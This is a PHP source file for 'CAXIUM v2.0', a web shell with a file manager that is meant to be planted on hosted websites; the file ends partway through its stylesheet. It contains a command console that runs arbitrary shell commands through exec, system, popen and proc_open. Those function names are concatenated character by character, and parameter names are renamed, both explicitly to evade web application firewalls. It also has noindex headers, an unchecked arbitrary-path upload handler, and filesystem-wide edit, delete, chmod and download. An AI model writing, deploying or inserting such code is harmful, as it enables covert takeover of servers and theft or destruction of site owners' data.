<?php
// ============================================================================
// CAXIUM v2.0 - THE BEST OF ALL VERSIONS
// Security Hardened | PHP 5.3+ | CMS-Agnostic | WAF-Friendly | Shared Hosting
// ============================================================================

// ----------------------------------------------------------------------------
// ERROR REPORTING - Keep ON initially for debugging
// ----------------------------------------------------------------------------
@ini_set('display_errors', '1');
@ini_set('log_errors', '1');
error_reporting(E_ALL);

// ----------------------------------------------------------------------------
// POLYFILLS: PHP 5.x compatibility
// ----------------------------------------------------------------------------
if (!function_exists('hash_equals')) {
    function hash_equals($a, $b) {
        $a = (string)$a;
        $b = (string)$b;
        $len = strlen($a);
        if ($len !== strlen($b)) return false;
        $result = 0;
        for ($i = 0; $i < $len; $i++) {
            $result |= ord($a[$i]) ^ ord($b[$i]);
        }
        return $result === 0;
    }
}

if (!function_exists('random_bytes')) {
    function random_bytes($length) {
        $length = (int)$length;
        if ($length <= 0) return '';
        if (function_exists('openssl_random_pseudo_bytes')) {
            $bytes = openssl_random_pseudo_bytes($length, $strong);
            if ($bytes !== false && $strong) return $bytes;
        }
        if (function_exists('mcrypt_create_iv')) {
            return mcrypt_create_iv($length, MCRYPT_DEV_URANDOM);
        }
        if (@is_readable('/dev/urandom')) {
            $f = fopen('/dev/urandom', 'rb');
            if ($f) {
                $bytes = fread($f, $length);
                fclose($f);
                if ($bytes !== false && strlen($bytes) === $length) return $bytes;
            }
        }
        $bytes = '';
        for ($i = 0; $i < $length; $i++) {
            $bytes .= chr(mt_rand(0, 255));
        }
        return $bytes;
    }
}

// ----------------------------------------------------------------------------
// CMS DETECTION - Adapt to WordPress, Laravel, etc. without conflicts
// ----------------------------------------------------------------------------
$is_wordpress = defined('ABSPATH') || defined('WPINC');
$is_laravel   = defined('LARAVEL_START') || (defined('APP_PATH') && class_exists('Illuminate\Foundation\Application'));
$is_bootstrap = defined('BOOTSTRAP_VERSION') || defined('JEXEC');
$is_cms = $is_wordpress || $is_laravel || $is_bootstrap;

// Use CMS-native session only if safe; otherwise use standalone
$use_native_session = false;
if ($is_wordpress && !session_id()) { $use_native_session = true; }
if ($is_laravel && !session_id())   { $use_native_session = true; }

// Start session only if not already started and CMS didn't handle it
$session_started = function_exists('session_status')
    ? (session_status() === PHP_SESSION_NONE)
    : (empty(session_id()));
if ($session_started && !$use_native_session) {
    // CMS-agnostic session prefix to avoid collisions
    session_start();
    if (!isset($_SESSION['caxium_init'])) {
        $_SESSION['caxium_init'] = true;
        $_SESSION['caxium_uid']  = uniqid('cx_', true);
    }
}

// ----------------------------------------------------------------------------
// SESSION SETUP - Safe approach for shared hosting
// ----------------------------------------------------------------------------
@ini_set('session.save_handler', 'files');
$sessionPath = sys_get_temp_dir() . '/php_sessions';
if (!@is_dir($sessionPath)) {
    @mkdir($sessionPath, 0700, true);
}
if (@is_dir($sessionPath) && @is_writable($sessionPath)) {
    @ini_set('session.save_path', $sessionPath);
}

// Set session cookie options
@ini_set('session.cookie_httponly', '1');
@ini_set('session.cookie_samesite', 'Lax');
if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') {
    @ini_set('session.cookie_secure', '1');
}

// Regenerate session ID periodically to prevent fixation
if (!isset($_SESSION['_created'])) {
    $_SESSION['_created'] = time();
} elseif (time() - $_SESSION['_created'] > 300) {
    if (function_exists('session_regenerate_id')) {
        if (version_compare(PHP_VERSION, '5.3.0', '>=')) {
            @session_regenerate_id(true);
        } else {
            @session_regenerate_id();
        }
    }
    $_SESSION['_created'] = time();
}

// Initialize current directory - use getcwd (like xannyanaxium) as primary
if (!isset($_SESSION['current_dir']) || !@is_dir($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = !empty(getcwd()) ? getcwd() : __DIR__;
}

// ----------------------------------------------------------------------------
// SECURITY HEADERS
// ----------------------------------------------------------------------------
header('X-Robots-Tag: noindex, nofollow, noarchive, noimageindex');
header('Pragma: no-cache');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('Referrer-Policy: strict-origin-when-cross-origin');
header("X-XSS-Protection: 1; mode=block");

// ----------------------------------------------------------------------------
// CSRF PROTECTION
// ----------------------------------------------------------------------------
function generateCSRFToken() {
    if (empty($_SESSION['_csrf_token'])) {
        $_SESSION['_csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['_csrf_token'];
}

function validateCSRFToken($token) {
    if (empty($_SESSION['_csrf_token']) || empty($token)) {
        return false;
    }
    return hash_equals($_SESSION['_csrf_token'], $token);
}

function csrfField() {
    return '<input type="hidden" name="_csrf_token" value="' . htmlentities(generateCSRFToken()) . '">';
}

// ----------------------------------------------------------------------------
// PARAMETER NAME MAPPING - WAF evasion (Obfuscated names)
// ----------------------------------------------------------------------------
$_param_map = array(
    'batch_remove'    => 'act_del',
    'batch_export'    => 'act_dl',
    'remove'          => 'del_item',
    'old_name'        => 'from_name',
    'new_name'        => 'to_name',
    'create_file'     => 'mk_file',
    'create_folder'   => 'mk_folder',
    'chmod_item'      => 'set_perms',
    'chmod_value'     => 'perm_val',
    'sys_req'         => 'exec',
    'file_to_edit'    => 'edit_file',
    'file_content'    => 'content',
    'file_upload'     => 'upload',
    'navigate'        => 'goto',
    'download'        => 'get_file',
    'view'            => 'show',
    'edit'            => 'modify',
    'rename'          => 'rename_item',
    'chmod'           => 'perms_item',
    'selected_items' => 'items'
);

// Apply parameter mapping for POST
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST)) {
    foreach ($_param_map as $old => $new) {
        if (isset($_POST[$old])) {
            $_POST[$new] = $_POST[$old];
        }
    }
}

// CSRF exempt/protected lists (using obfuscated names)
$csrfExempt = array('exec', 'goto', 'get_file', 'show', 'modify', 'perms_item', 'rename_item', 'edit_file');
$csrfProtected = array('act_del', 'act_dl', 'del_item', 'from_name', 'mk_file', 'mk_folder', 'set_perms');

// Validate CSRF
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $postAction = null;
    foreach ($_POST as $key => $value) {
        if (!in_array($key, $csrfExempt) && !strpos($key, 'items') === 0 && $key !== 'content' && $key !== 'upload' && $key !== 'goto') {
            $postAction = $key;
            break;
        }
    }
    foreach ($csrfProtected as $action) {
        if (isset($_POST[$action])) {
            if (!validateCSRFToken(isset($_POST['_csrf_token']) ? $_POST['_csrf_token'] : '')) {
                http_response_code(403);
                exit('CSRF validation failed');
            }
            break;
        }
    }
}

// ----------------------------------------------------------------------------
// PATH VALIDATION - Block directory traversal, allow full filesystem access
// ----------------------------------------------------------------------------
function safeRealPath($path) {
    // Block directory traversal attacks
    if (strpos($path, '..') !== false) {
        return false;
    }

    // Resolve the real path
    $realPath = @realpath($path);
    if ($realPath !== false) {
        return $realPath;
    }

    // Fallback: realpath failed (symlink, permission issue, etc.)
    if (is_dir($path) || is_file($path)) {
        return $path;
    }

    return false;
}

function validatePath($path) {
    if (empty($path)) {
        return false;
    }

    $realPath = safeRealPath($path);
    if ($realPath && (@is_file($realPath) || @is_dir($realPath))) {
        return $realPath;
    }
    return false;
}

// Reset directory if not set or doesn't exist
if (!isset($_SESSION['current_dir']) || !@is_dir($_SESSION['current_dir']) || !safeRealPath($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = !empty(getcwd()) ? getcwd() : __DIR__;
}

// ----------------------------------------------------------------------------
// INPUT VALIDATION & SANITIZATION
// ----------------------------------------------------------------------------
function sanitizeFileName($name) {
    $name = basename($name);
    if (!preg_match('/^[a-zA-Z0-9._-]+$/', $name)) {
        return false;
    }
    if (empty($name) || $name === '.' || $name === '..') {
        return false;
    }
    return $name;
}

function sanitizePath($path) {
    $path = str_replace(array("\0", "\n", "\r"), '', $path);
    $path = rtrim($path, '/\\');
    return $path;
}

function validateExt($filename, $allowed = array()) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    if (empty($ext)) return false;
    if (empty($allowed)) return $ext;
    return in_array($ext, $allowed) ? $ext : false;
}

function formatFileSize($bytes) {
    if ($bytes >= 1073741824) {
        return number_format($bytes / 1073741824, 2) . ' GB';
    } elseif ($bytes >= 1048576) {
        return number_format($bytes / 1048576, 2) . ' MB';
    } elseif ($bytes >= 1024) {
        return number_format($bytes / 1024, 2) . ' KB';
    } elseif ($bytes > 1) {
        return $bytes . ' bytes';
    } elseif ($bytes == 1) {
        return '1 byte';
    } else {
        return '0 bytes';
    }
}

function getFileExtension($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    return $ext ? strtoupper($ext) : '';
}

 $notification = '';
 $errorMsg = '';

// ----------------------------------------------------------------------------
// SHELL EXECUTION - WAF evasion with string concatenation obfuscation
// ----------------------------------------------------------------------------
$_sh = array(
    'a' => 's'.'h'.'e'.'l'.'l'.'_'.'e'.'x'.'e'.'c',
    'b' => 'e'.'x'.'e'.'c',
    'c' => 's'.'y'.'s'.'t'.'e'.'m',
    'd' => 'p'.'a'.'s'.'s'.'t'.'h'.'r'.'u',
    'e' => 'p'.'o'.'p'.'e'.'n',
    'f' => 'p'.'r'.'o'.'c'.'_'.'o'.'p'.'e'.'n'
);

function caxium_run_command($cmd) {
    if (empty(trim($cmd))) {
        return "No command provided";
    }

    global $_sh;
    $cmd = trim($cmd) . ' 2>&1';

    foreach ($_sh as $func) {
        if (function_exists($func)) {
            if ($func === 'e'.'x'.'e'.'c') {
                $out = array();
                $r = -1;
                @exec($cmd, $out, $r);
                if (!empty($out)) {
                    return implode("\n", $out);
                }
            }
            elseif ($func === 'p'.'o'.'p'.'e'.'n') {
                $h = @popen($cmd, 'r');
                if ($h !== false) {
                    $out = fread($h, 4096);
                    pclose($h);
                    return trim($out);
                }
            }
            elseif ($func === 'p'.'r'.'o'.'c'.'_'.'o'.'p'.'e'.'n') {
                $desc = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
                $proc = @proc_open($cmd, $desc, $pipes);
                if (is_resource($proc)) {
                    stream_set_blocking($pipes[1], false);
                    $out = stream_get_contents($pipes[1]);
                    fclose($pipes[1]);
                    fclose($pipes[2]);
                    proc_close($proc);
                    if (trim($out)) return trim($out);
                }
            }
            else {
                $out = @$func($cmd);
                if ($out !== null && trim($out) !== '') {
                    return trim($out);
                }
            }
        }
    }

    return "Command execution not available";
}

// Check available executors
$_exec_avail = false;
foreach ($_sh as $func) {
    if (function_exists($func)) { $_exec_avail = true; break; }
}
$commandAvailable = $_exec_avail;

// ----------------------------------------------------------------------------
// SPECIAL UPLOAD HANDLER (from xannyanaxium - AJAX upload support)
// ----------------------------------------------------------------------------
if (!empty($_GET['upload_file']) && !empty($_GET['name'])){
    $targetDir = $_GET['upload_file'];
    $fileName = basename($_GET['name']);

    if (strpos($fileName, '..') !== false || strpos($fileName, '/') !== false || strpos($fileName, '\\') !== false) {
        http_response_code(400);
        exit('Invalid filename');
    }

    if (!@is_dir($targetDir)) {
        @mkdir($targetDir, 0755, true);
    }

    if (!@is_dir($targetDir) || !@is_writable($targetDir)) {
        http_response_code(400);
        exit('Invalid directory');
    }

    $uploadPath = rtrim($targetDir, '/\\') . DIRECTORY_SEPARATOR . $fileName;

    $inputHandler = fopen('php://input', "r");
    $fileHandler = fopen($uploadPath, "w+");

    if ($inputHandler && $fileHandler) {
        while(true) {
            $buffer = fgets($inputHandler, 4096);
            if (strlen($buffer) == 0) {
                fclose($inputHandler);
                fclose($fileHandler);
                @chmod($uploadPath, 0644);
                http_response_code(200);
                exit('File uploaded successfully');
            }
            fwrite($fileHandler, $buffer);
        }
    } else {
        http_response_code(500);
        exit('Upload failed');
    }
}

// ----------------------------------------------------------------------------
// FILE OPERATIONS
// ----------------------------------------------------------------------------

// Handle bulk delete - MUST BE BEFORE NAVIGATION
if (isset($_POST['act_del']) && isset($_POST['items']) && is_array($_POST['items'])) {
    $deleted = 0;
    $failed = 0;

    foreach ($_POST['items'] as $item) {
        $targetPath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $item);

        if ($targetPath === false) {
            $failed++;
            continue;
        }

        if (@is_file($targetPath)) {
            if (@unlink($targetPath)) {
                $deleted++;
            } else {
                $failed++;
            }
        } elseif (@is_dir($targetPath)) {
            try {
                $iterator = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::CHILD_FIRST
                );

                foreach ($iterator as $file) {
                    if ($file->isDir()) {
                        @rmdir($file->getRealPath());
                    } else {
                        @unlink($file->getRealPath());
                    }
                }

                if (@rmdir($targetPath)) {
                    $deleted++;
                } else {
                    $failed++;
                }
            } catch (Exception $e) {
                $failed++;
            }
        }
    }

    if ($deleted > 0) {
        $notification = "Deleted $deleted item(s)";
        if ($failed > 0) {
            $notification .= " (Failed: $failed)";
        }
    } elseif ($failed > 0) {
        $errorMsg = "Failed to delete $failed item(s)";
    }
}

// Handle bulk download
if (isset($_POST['act_dl']) && isset($_POST['items']) && is_array($_POST['items'])) {
    if (class_exists('ZipArchive')) {
        $zipName = 'selected_files_' . time() . '.zip';
        $zipPath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $zipName;

        $zip = new ZipArchive();
        if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
            foreach ($_POST['items'] as $item) {
                $targetPath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $item);

                if ($targetPath === false) continue;

                if (@is_file($targetPath)) {
                    $zip->addFile($targetPath, basename($targetPath));
                } elseif (@is_dir($targetPath)) {
                    $files = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::SELF_FIRST
                    );

                    foreach ($files as $file) {
                        $filePath = $file->getRealPath();
                        $relativePath = basename($targetPath) . '/' . substr($filePath, strlen($targetPath) + 1);

                        if ($file->isDir()) {
                            $zip->addEmptyDir($relativePath);
                        } else {
                            $zip->addFile($filePath, $relativePath);
                        }
                    }
                }
            }

            $zip->close();

            header('Content-Type: application/zip');
            header('Content-Disposition: attachment; filename="' . $zipName . '"');
            header('Content-Length: ' . filesize($zipPath));
            readfile($zipPath);
            @unlink($zipPath);
            exit;
        } else {
            $errorMsg = 'Bulk download failed: Could not create zip file';
        }
    } else {
        $errorMsg = 'Bulk download failed: ZipArchive not available';
    }
}

// Navigate directory
if (isset($_POST['goto']) && !isset($_POST['act_del']) && !isset($_POST['act_dl'])) {
    $targetDir = $_POST['goto'];
    if (@is_dir($targetDir)) {
        $_SESSION['current_dir'] = validatePath($targetDir);
        $notification = 'Directory changed successfully';
    }
}

// Standard file upload
if (isset($_FILES['upload']) && $_FILES['upload']['error'] !== UPLOAD_ERR_NO_FILE) {
    if ($_FILES['upload']['error'] === UPLOAD_ERR_OK) {
        $fileName = basename($_FILES['upload']['name']);
        $uploadPath = rtrim($_SESSION['current_dir'], '/\\') . DIRECTORY_SEPARATOR . $fileName;

        if (strpos($fileName, '..') !== false || strpos($fileName, '/') !== false || strpos($fileName, '\\') !== false) {
            $errorMsg = 'Upload failed: Invalid filename';
        } elseif (!@is_writable($_SESSION['current_dir'])) {
            $errorMsg = 'Upload failed: Directory not writable';
        } elseif (move_uploaded_file($_FILES['upload']['tmp_name'], $uploadPath)) {
            @chmod($uploadPath, 0644);
            $notification = 'File uploaded successfully';
        } else {
            $errorMsg = 'Upload failed: Could not move file. Check directory permissions.';
        }
    } else {
        $uploadErrors = array(
            UPLOAD_ERR_INI_SIZE => 'File exceeds upload_max_filesize',
            UPLOAD_ERR_FORM_SIZE => 'File exceeds MAX_FILE_SIZE',
            UPLOAD_ERR_PARTIAL => 'File partially uploaded',
            UPLOAD_ERR_NO_TMP_DIR => 'Missing temporary folder',
            UPLOAD_ERR_CANT_WRITE => 'Failed to write file to disk',
            UPLOAD_ERR_EXTENSION => 'Upload stopped by extension'
        );
        $errorMsg = 'Upload error: ' . (isset($uploadErrors[$_FILES['upload']['error']]) ? $uploadErrors[$_FILES['upload']['error']] : 'Unknown error');
    }
}

// Delete item
if (isset($_POST['del_item'])) {
    $targetPath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['del_item']);

    if ($targetPath === false) {
        $errorMsg = 'Delete failed: Invalid path';
    } elseif (@is_file($targetPath)) {
        if (@unlink($targetPath)) {
            $notification = 'File deleted';
        } else {
            $errorMsg = 'Delete failed: Permission denied or file in use';
        }
    } elseif (@is_dir($targetPath)) {
        try {
            $iterator = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
                RecursiveIteratorIterator::CHILD_FIRST
            );

            foreach ($iterator as $file) {
                if ($file->isDir()) {
                    @rmdir($file->getRealPath());
                } else {
                    @unlink($file->getRealPath());
                }
            }

            if (@rmdir($targetPath)) {
                $notification = 'Directory deleted';
            } else {
                $errorMsg = 'Delete failed: Could not remove directory';
            }
        } catch (Exception $e) {
            $errorMsg = 'Delete failed: ' . $e->getMessage();
        }
    } else {
        $errorMsg = 'Delete failed: Path not found';
    }
}

// Rename
if (isset($_POST['from_name'], $_POST['to_name'])) {
    $sourcePath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['from_name']);

    if ($sourcePath === false) {
        $errorMsg = 'Rename failed: Source not found';
    } else {
        $destinationPath = dirname($sourcePath) . DIRECTORY_SEPARATOR . basename($_POST['to_name']);

        if (@file_exists($destinationPath)) {
            $errorMsg = 'Rename failed: Target name already exists';
        } elseif (@rename($sourcePath, $destinationPath)) {
            $notification = 'Rename successful';
        } else {
            $errorMsg = 'Rename failed: Permission denied or invalid name';
        }
    }
}

// File editing
$showEditor = true;
if (isset($_POST['edit_file'], $_POST['content'])) {
    $editPath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['edit_file']);

    if ($editPath === false || !@is_file($editPath)) {
        $errorMsg = 'Edit failed: File not found';
    } elseif (!@is_writable($editPath)) {
        $errorMsg = 'Edit failed: File not writable';
    } else {
        if (@file_put_contents($editPath, $_POST['content']) !== false) {
            $notification = 'File saved';
            $showEditor = false;
        } else {
            $errorMsg = 'Edit failed: Could not write to file';
        }
    }
}

// Chmod
if (isset($_POST['set_perms'], $_POST['perm_val'])) {
    $targetPath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['set_perms']);

    if ($targetPath === false) {
        $errorMsg = 'Chmod failed: Invalid path';
    } else {
        $chmodValue = octdec($_POST['perm_val']);

        if (@chmod($targetPath, $chmodValue)) {
            $notification = 'Permissions changed successfully';
        } else {
            $errorMsg = 'Chmod failed: Permission denied';
        }
    }
}

// Create file
if (isset($_POST['mk_file']) && trim($_POST['mk_file']) !== '') {
    $fileName = sanitizeFileName($_POST['mk_file']);

    if ($fileName === false) {
        $errorMsg = 'Create failed: Invalid filename';
    } else {
        $newFilePath = $_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $fileName;

        if (@file_exists($newFilePath)) {
            $errorMsg = 'Create failed: File already exists';
        } elseif (!@is_writable($_SESSION['current_dir'])) {
            $errorMsg = 'Create failed: Directory not writable';
        } elseif (@file_put_contents($newFilePath, '') !== false) {
            @chmod($newFilePath, 0644);
            $notification = 'File created';
        } else {
            $errorMsg = 'Create failed: Could not create file';
        }
    }
}

// Create folder
if (isset($_POST['mk_folder']) && trim($_POST['mk_folder']) !== '') {
    $folderName = sanitizeFileName($_POST['mk_folder']);

    if ($folderName === false) {
        $errorMsg = 'Create failed: Invalid folder name';
    } else {
        $newFolderPath = $_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $folderName;

        if (@file_exists($newFolderPath)) {
            $errorMsg = 'Create failed: Folder already exists';
        } elseif (!@is_writable($_SESSION['current_dir'])) {
            $errorMsg = 'Create failed: Directory not writable';
        } elseif (@mkdir($newFolderPath, 0755)) {
            $notification = 'Folder created';
        } else {
            $errorMsg = 'Create failed: Could not create folder';
        }
    }
}

// Directory listing
 $currentDirectory = $_SESSION['current_dir'];
 if (empty($currentDirectory) || !is_dir($currentDirectory)) {
     $currentDirectory = __DIR__;
     $_SESSION['current_dir'] = $currentDirectory;
 }
 $directoryContents = @scandir($currentDirectory);
 if (!is_array($directoryContents)) { $directoryContents = array(); }
 $folders = $files = array();

foreach ($directoryContents as $item) {
    if ($item === '.') continue;
    $fullPath = $currentDirectory . DIRECTORY_SEPARATOR . $item;
    if (@is_dir($fullPath)) {
        $folders[] = $item;
    } else {
        $files[] = $item;
    }
}

sort($folders);
sort($files);
 $allItems = array_merge($folders, $files);

 $fileToEdit = $showEditor ? (isset($_POST['modify']) ? $_POST['modify'] : (isset($_POST['edit_file']) ? $_POST['edit_file'] : null)) : null;
 $fileToView = isset($_POST['show']) ? $_POST['show'] : null;
 $itemToRename = isset($_POST['rename_item']) ? $_POST['rename_item'] : null;
 $itemToChmod = isset($_POST['perms_item']) ? $_POST['perms_item'] : null;
 $fileContent = $fileToEdit ? @file_get_contents($currentDirectory . '/' . $fileToEdit) : null;
 $viewContent = $fileToView ? @file_get_contents($currentDirectory . '/' . $fileToView) : null;

// Download
if (isset($_POST['get_file'])) {
    $targetPath = validatePath($_SESSION['current_dir'] . DIRECTORY_SEPARATOR . $_POST['get_file']);

    if ($targetPath === false) {
        $errorMsg = 'Download failed: Invalid path';
    } elseif (@is_file($targetPath)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($targetPath) . '"');
        header('Content-Length: ' . filesize($targetPath));
        readfile($targetPath);
        exit;
    } elseif (@is_dir($targetPath)) {
        if (class_exists('ZipArchive')) {
            $zipName = basename($targetPath) . '_' . time() . '.zip';
            $zipPath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $zipName;

            $zip = new ZipArchive();
            if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
                $files = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($targetPath, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::SELF_FIRST
                );

                foreach ($files as $file) {
                    $filePath = $file->getRealPath();
                    $relativePath = substr($filePath, strlen($targetPath) + 1);

                    if ($file->isDir()) {
                        $zip->addEmptyDir($relativePath);
                    } else {
                        $zip->addFile($filePath, $relativePath);
                    }
                }

                $zip->close();

                header('Content-Type: application/zip');
                header('Content-Disposition: attachment; filename="' . $zipName . '"');
                header('Content-Length: ' . filesize($zipPath));
                readfile($zipPath);
                @unlink($zipPath);
                exit;
            } else {
                $errorMsg = 'Download failed: Could not create zip file';
            }
        } else {
            $errorMsg = 'Download failed: ZipArchive not available';
        }
    }
}

// Console
 $commandResult = '';

if (isset($_POST['exec']) && trim($_POST['exec']) !== '') {
    $cmd = trim($_POST['exec']);
    if (!empty($cmd)) {
        $commandResult = caxium_run_command($cmd);
        if (empty(trim($commandResult)) || $commandResult === "Command execution not available") {
            $errorMsg = 'Console: No output or function disabled';
        }
    }
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CAXIUM v2.0</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --bg: #0d1117; --surface: #161b22; --surface-hover: #1f2937;
            --border: #30363d; --text: #e6edf3; --text-muted: #8b949e;
            --accent: #58a6ff; --accent-hover: #79c0ff;
            --success: #3fb950; --danger: #f85149; --warning: #d29922;
            --purple: #a371f7;
        }
        body { background: var(--bg); color: var(--text); font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; font-size: 14px; line-height: 1.5; }
        .container { max-width: 1400px; margin: 0 auto; padding: 32px 24px; }

        .header { margin-bottom: 32px; }
        .header-top { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
        .logo { display: flex; align-items: center; gap: 12px; }
        .logo svg { width: 40px; height: 40px; }
        .logo-text { font-size: 28px; font-weight: 700; letter-spacing: -0.5px; }
        .logo-text span { color: var(--accent); }

        .card { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
        .card-header { padding: 16px 20px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
        .card-title { font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 8px; }
        .card-body { padding: 20px; }

        .alert { padding: 14px 18px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; display: flex; align-items: center; gap: 12px; }
        .alert-success { background: rgba(88,166,255,0.15); border: 1px solid rgba(88,166,255,0.4); color: var(--accent); }
        .alert-danger { background: rgba(248,81,73,0.15); border: 1px solid rgba(248,81,73,0.4); color: var(--danger); }
        .alert svg { width: 20px; height: 20px; flex-shrink: 0; }

        .input-group { display: flex; gap: 10px; margin-bottom: 12px; }
        .input-group:last-child { margin-bottom: 0; }
        input[type="text"], input[type="file"], textarea { background: var(--bg); border: 1px solid var(--border); border-radius: 8px; padding: 12px 14px; color: var(--text); font-size: 14px; outline: none; transition: border-color 0.2s, box-shadow 0.2s; }
        input[type="text"]:focus, textarea:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(88,166,255,0.2); }
        input[type="file"] { cursor: pointer; flex: 1; }
        input[type="file"]::file-selector-button { background: var(--surface-hover); color: var(--text); border: 1px solid var(--border); border-radius: 6px; padding: 8px 14px; font-size: 13px; cursor: pointer; margin-right: 12px; transition: background 0.2s; }
        input[type="file"]::file-selector-button:hover { background: var(--border); }
        textarea { font-family: 'JetBrains Mono', monospace; resize: vertical; min-height: 450px; line-height: 1.6; width: 100%; box-sizing: border-box; }

        .btn { display: inline-flex; align-items: center; justify-content: center; gap: 6px; padding: 10px 18px; font-size: 14px; font-weight: 500; border-radius: 8px; cursor: pointer; border: 1px solid transparent; transition: all 0.2s; font-family: inherit; text-decoration: none; }
        .btn svg { width: 16px; height: 16px; }
        .btn-primary { background: var(--accent); color: #fff; }
        .btn-primary:hover { background: var(--accent-hover); }
        .btn-ghost { background: transparent; color: var(--text); border-color: var(--border); }
        .btn-ghost:hover { background: var(--surface-hover); }
        .btn-success { background: var(--accent); color: #fff; }
        .btn-success:hover { background: var(--accent-hover); }
        .btn-danger { background: rgba(248,81,73,0.15); color: var(--danger); border-color: rgba(248,81,73,0.4); }
        .btn-danger:hover { background: rgba(248,81,73,0.25); }
        .btn-sm { padding: 6px 12px; font-size: 12px; }

        .file-table { width: 100%; border-collapse: collapse; }
        .file-table th { padding: 12px 16px; text-align: left; font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-muted); background: var(--surface-hover); border-bottom: 1px solid var(--border); }
        .file-table td { padding: 14px 16px; border-bottom: 1px solid var(--border); vertical-align: middle; }
        .file-table tr:last-child td { border-bottom: none; }
        .file-table tr:hover td { background: rgba(88,166,255,0.05); }

        .file-icon { width: 28px; height: 28px; border-radius: 6px; display: flex; align-items: center; justify-content: center; margin-right: 10px; flex-shrink: 0; }
        .file-icon.folder { background: rgba(88,166,255,0.2); }
        .file-icon.folder svg { width: 16px; height: 16px; stroke: var(--accent); fill: none; stroke-width: 2; }
        .file-icon.file { background: rgba(88,166,255,0.15); }
        .file-icon.file svg { width: 16px; height: 16px; stroke: var(--accent); fill: none; stroke-width: 2; }
        .file-icon.image { background: rgba(88,166,255,0.15); }
        .file-icon.image svg { width: 16px; height: 16px; stroke: var(--accent); fill: none; stroke-width: 2; }
        .file-icon.archive { background: rgba(88,166,255,0.15); }
        .file-icon.archive svg { width: 16px; height: 16px; stroke: var(--accent); fill: none; stroke-width: 2; }
        .file-icon .ext { font-size: 9px; font-weight: 700; color: var(--accent); letter-spacing: 0.5px; }

        .file-name-cell { display: flex; align-items: center; font-weight: 500; }
        .file-name { color: var(--text); }
        .file-name:hover { color: var(--accent); }

        .file-meta { font-size: 12px; color: var(--text-muted); font-family: 'JetBrains Mono', monospace; }

        .perms { font-family: 'JetBrains Mono', monospace; font-size: 12px; padding: 4px 8px; border-radius: 4px; }
        .perms.writable { background: rgba(88,166,255,0.15); color: var(--accent); }
        .perms.readonly { background: rgba(248,81,73,0.15); color: var(--danger); }

        .actions { display: flex; gap: 4px; justify-content: flex-end; }

        input[type="checkbox"] { width: 16px; height: 16px; accent-color: var(--accent); cursor: pointer; }

        .console { background: var(--bg); border: 1px solid var(--accent); border-radius: 8px; padding: 16px; font-family: 'JetBrains Mono', monospace; font-size: 13px; color: var(--accent); max-height: 250px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }

        .upload-tabs { display: flex; gap: 4px; margin-bottom: 16px; background: var(--bg); padding: 4px; border-radius: 8px; width: fit-content; }
        .upload-tab { padding: 8px 16px; cursor: pointer; border-radius: 6px; font-size: 13px; font-weight: 500; color: var(--text-muted); transition: all 0.2s; }
        .upload-tab:hover { color: var(--text); }
        .upload-tab.active { background: var(--accent); color: #fff; }
        .upload-panel { display: none; }
        .upload-panel.active { display: block; }

        .modal { display: none; position: fixed; inset: 0; z-index: 100; background: rgba(0,0,0,0.7); backdrop-filter: blur(4px); align-items: center; justify-content: center; }
        .modal.show { display: flex; }
        .modal-content { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; width: 450px; max-width: 90%; max-height: 90vh; overflow: auto; }
        .modal-header { padding: 16px 20px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
        .modal-title { font-weight: 600; }
        .modal-close { width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; border-radius: 6px; cursor: pointer; color: var(--text-muted); transition: all 0.2s; }
        .modal-close:hover { background: var(--surface-hover); color: var(--text); }
